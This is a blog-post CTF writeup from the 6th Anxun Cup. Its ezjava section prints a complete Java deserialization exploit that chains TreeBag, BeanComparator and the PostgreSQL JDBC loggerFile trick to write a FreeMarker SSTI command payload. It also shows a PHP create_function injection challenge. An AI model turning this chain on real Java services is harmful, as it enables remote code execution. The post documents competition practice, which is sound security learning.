<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>第六届安洵杯网络安全挑战赛 Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="第六届安洵杯网络安全挑战赛 Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/12/24/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-12-23T16:35:44.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>December</span>
            <span>24,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">第六届安洵杯网络安全挑战赛 Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>排名：8</p>
<h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>拿了个一血<br>比较有意思的一题，给了CB和PSQL（vul）的依赖。但是链子断开了。我们需要想办法接上CB链的compare，这里我找到的是Treebag和Treemap，多的就不说，直接放exp了</p>
<h3 id="断链修复"><a href="#断链修复" class="headerlink" title="断链修复"></a>断链修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * exec:347, Runtime (java.lang)</span><br><span class="line"> * &lt;init&gt;:-1, a</span><br><span class="line"> * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line"> * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line"> * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line"> * newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line"> * newInstance:442, Class (java.lang)</span><br><span class="line"> * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line"> * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line"> * getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line"> * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line"> * invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line"> * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line"> * invoke:497, Method (java.lang.reflect)</span><br><span class="line"> * invokeMethod:2116, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line"> * getSimpleProperty:1267, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line"> * getNestedProperty:808, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line"> * getProperty:884, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line"> * getProperty:464, PropertyUtils (org.apache.commons.beanutils)</span><br><span class="line"> * compare:163, BeanComparator (org.apache.commons.beanutils)</span><br><span class="line"> * siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line"> * siftDown:687, PriorityQueue (java.util)</span><br><span class="line"> * heapify:736, PriorityQueue (java.util)</span><br><span class="line"> * readObject:795, PriorityQueue (java.util)</span><br><span class="line"> * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line"> * invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line"> * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line"> * invoke:497, Method (java.lang.reflect)</span><br><span class="line"> * invokeReadObject:1058, ObjectStreamClass (java.io)</span><br><span class="line"> * readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line"> * readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line"> * readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line"> * readObject:371, ObjectInputStream (java.io)</span><br><span class="line"> * base64deserial:66, SerializeUtils (com.javasec.utils)</span><br><span class="line"> * deserTester:312, SerializeUtils (com.javasec.utils)</span><br><span class="line"> * main:22, cb1 (com.javasec.pocs.cb)</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>
<p>cb链的调用栈如上，然后题目给的过滤如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ctf.axb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ArrayList&lt;String&gt; BLACKLIST = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> BLACKLIST.iterator();</span><br><span class="line"></span><br><span class="line">        String s;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!var2.hasNext()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            s = (String)var2.next();</span><br><span class="line">        &#125; <span class="keyword">while</span>(!desc.getName().startsWith(s));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, desc.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;com.sun.jndi&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;com.fasterxml.jackson&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;org.springframework&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;java.security.SignedObject&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;java.util.PriorityQueue&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里过滤了我们常见的链子，然后题目给的jdk环境是8u312，是高版本的jdk，那么jndi和rmi方面的就不要想了。所以思路就是给cb断链接上，compare方法还是很多的，熟悉一点的应该就该想起TreeMap&#x2F;Bag套餐了。<br>TreeBag的readObject逻辑如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703348910603-00041aff-5584-4cf7-ab74-7e94e842db1d.png#averageHue=%23282d36&clientId=u1c789ed5-6c9c-4&from=paste&height=319&id=uf6a2c6e7&originHeight=399&originWidth=1252&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69580&status=done&style=none&taskId=u3e70a896-1460-480a-9160-07424df3054&title=&width=1001.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703348924103-aee40ee0-e874-401f-bb11-63d1caa7c172.png#averageHue=%23282d35&clientId=u1c789ed5-6c9c-4&from=paste&height=274&id=ueac66224&originHeight=343&originWidth=1356&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42936&status=done&style=none&taskId=ucb981409-af00-4211-81ab-eb882b68901&title=&width=1084.8" alt="image.png"><br>这里会调用map的put方法，这里的map是treemap<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703348947068-add94a84-d1df-4737-b927-ac0635c05741.png#averageHue=%23292d36&clientId=u1c789ed5-6c9c-4&from=paste&height=307&id=u4a84e68e&originHeight=384&originWidth=1159&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50048&status=done&style=none&taskId=u73a01849-ef96-4fde-a5a7-6ca6de0145c&title=&width=927.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703348952312-cf3a0d0a-895e-4bff-b3ab-1a7da5853f01.png#averageHue=%23292e38&clientId=u1c789ed5-6c9c-4&from=paste&height=163&id=ubdfaa984&originHeight=204&originWidth=1102&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30484&status=done&style=none&taskId=ub9e5f880-ab3b-4f10-aaa8-210fd9aeb43&title=&width=881.6" alt="image.png"><br>那么我们只需要让compartor为<code>BeanComparator</code>即可。这样就可以完成后续的调用链，接上过后我们就可以触发任意类的getter了。这里题目特意给了个PgSQL的依赖，那我们就该往getConnection的JDBC ATTACK想了。</p>
<h3 id="getter"><a href="#getter" class="headerlink" title="getter"></a>getter</h3><p>这里我找到的是<code>pgConnectionPoolDataSource</code>，他是<code>BaseDataSource</code>的实现类，而<code>BaseDataSource</code>存在<code>getConnection</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703349060547-2cb27ca6-d699-44fa-8bc5-66ffe1faa3e7.png#averageHue=%23292e38&clientId=u1c789ed5-6c9c-4&from=paste&height=135&id=uf1c08281&originHeight=169&originWidth=852&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19450&status=done&style=none&taskId=u2cc8fd45-9858-41fc-bdb7-bca8746a455&title=&width=681.6" alt="image.png"><br>那么我们只需要让<code>BeanComparator</code>的property为<code>connection</code>就好了，这样就会触发getter。</p>
<h3 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h3><p>这里题目特地给了一个freemaker模板，那么肯定和ssti有关。题目的start.sh如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo $D0g3CTF &gt; /flag</span><br><span class="line">chmod 444 /flag</span><br><span class="line">unset D0g3CTF</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -Z</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -m state --state NEW -j DROP</span><br><span class="line">iptables -P OUTPUT DROP</span><br><span class="line">iptables -n -L</span><br><span class="line">java -jar /app/ezjava.jar</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>做了不出网的限制。那思路就是覆盖index.ftl的内容，完成SSTI，最终payload如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> com.javasec.utils.SerializeUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.bag.TreeBag;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.BooleanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.ComparableComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.postgresql.ds.PGConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.FileSystemXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">PGConnectionPoolDataSource</span> <span class="variable">pgConnectionPoolDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PGConnectionPoolDataSource</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerLevel</span> <span class="operator">=</span> <span class="string">&quot;debug&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerFile</span> <span class="operator">=</span> <span class="string">&quot;/app/templates/index.ftl&quot;</span>;</span><br><span class="line">        String shellContent=<span class="string">&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span>+<span class="string">&quot;&lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span>+<span class="string">&quot;&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span>+<span class="string">&quot;&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;/$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;cat /flag\&quot;)&#125;&quot;</span>;</span><br><span class="line">        System.out.println(shellContent);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://&quot;</span>+<span class="string">&quot;123&quot;</span>+<span class="string">&quot;/aaaa?ApplicationName=&quot;</span>+<span class="string">&quot;123123123&quot;</span>+<span class="string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+<span class="string">&quot;&amp;loggerLevel=&quot;</span>+loggerLevel;</span><br><span class="line">        pgConnectionPoolDataSource.setURL(jdbcUrl);</span><br><span class="line">        pgConnectionPoolDataSource.setServerNames(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;shellContent&#125;);</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        SerializeUtils.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;connection&quot;</span>);</span><br><span class="line">        <span class="type">TreeBag</span> <span class="variable">treeBag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeBag</span>(comparator);</span><br><span class="line">        TreeMap&lt;Object,Object&gt; m = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        SerializeUtils.setFieldValue(m, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        SerializeUtils.setFieldValue(m, <span class="string">&quot;modCount&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC = Class.forName(<span class="string">&quot;java.util.TreeMap$Entry&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">MutableInteger</span> <span class="operator">=</span> SerializeUtils.createWithoutConstructor(<span class="string">&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> nodeCons.newInstance(pgConnectionPoolDataSource,MutableInteger, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">right</span> <span class="operator">=</span> nodeCons.newInstance(pgConnectionPoolDataSource, MutableInteger, node);</span><br><span class="line">        SerializeUtils.setFieldValue(node, <span class="string">&quot;right&quot;</span>, right);</span><br><span class="line">        SerializeUtils.setFieldValue(m, <span class="string">&quot;root&quot;</span>, node);</span><br><span class="line">        SerializeUtils.setFieldValue(m, <span class="string">&quot;comparator&quot;</span>, comparator);</span><br><span class="line">        SerializeUtils.setFieldValue(treeBag,<span class="string">&quot;map&quot;</span>,m);</span><br><span class="line">        System.out.println(SerializeUtils.base64serial(treeBag));</span><br><span class="line">        SerializeUtils.deserTester(treeBag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>生成后直接打入，可以看到flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703337142838-cb94f815-0d4e-4d54-b61f-337dfe877d03.png#averageHue=%23f2f2f2&clientId=u5608755b-8319-4&from=paste&height=608&id=u1991cc14&originHeight=608&originWidth=946&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35640&status=done&style=none&taskId=u44e80105-04c3-41d6-8527-aefcbb672e3&title=&width=946" alt="f5a0cc4743e3f83ecc7ecfa83e8e3f44.png"></p>
<h2 id="what’s-my-name"><a href="#what’s-my-name" class="headerlink" title="what’s my name"></a>what’s my name</h2><p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$d0g3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;d0g3&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?:.&#123;5&#125;)*include/&#x27;</span>,<span class="variable">$d0g3</span>))&#123;</span><br><span class="line">    <span class="variable">$sorter</span>=<span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line">    <span class="variable">$miao</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$miao</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$d0g3</span>)==<span class="title function_ invoke__">substr</span>(<span class="variable">$miao</span>, -<span class="number">2</span>)&amp;&amp;<span class="variable">$name</span>===<span class="variable">$miao</span>)&#123;</span><br><span class="line">        <span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$d0g3</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$d0g3</span> . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line">        @<span class="variable">$miao</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="variable">$sort_function</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;Is That My Name?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;YOU Do Not Know What is My Name!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
